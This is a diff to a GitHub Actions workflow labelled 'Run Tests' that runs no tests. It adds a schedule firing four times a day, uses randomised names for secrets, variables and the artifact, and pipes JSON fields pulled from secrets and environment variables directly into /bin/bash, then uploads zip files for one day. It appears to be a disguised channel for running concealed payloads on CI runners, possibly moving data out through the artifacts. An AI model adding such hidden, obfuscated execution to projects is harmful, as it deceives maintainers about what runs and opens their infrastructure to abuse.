@@ -2,6 +2,8 @@ name: Run Tests
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '34 0,6,12,18 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,17 +18,17 @@ jobs:
           fetch-depth: 1
       - name: Run
         env:
-          joss92: ${{ secrets.joss92 }}
+          plyjd9291: ${{ secrets.plyjd9291 }}
         run: |
-          printf '%s' "$joss92" | jq -r .shd1 | /bin/bash
-          printf '%s' "$mpyl0" | jq -r .rv51 | /bin/bash
-          echo $pb749 | jq -r .qkw65 | /bin/bash
-          echo $imbqx87 | jq -r .ih763 | /bin/bash
+          printf '%s' "$plyjd9291" | jq -r .enfwv75315 | /bin/bash
+          printf '%s' "$gxhc07287" | jq -r .rbepx9 | /bin/bash
+          echo $qtk96 | jq -r .x8 | /bin/bash
+          echo $ohf861 | jq -r .o189 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: xFZhzd7g
+          name: UuSTEaDF
           path: "*.zip"
           retention-days: 1
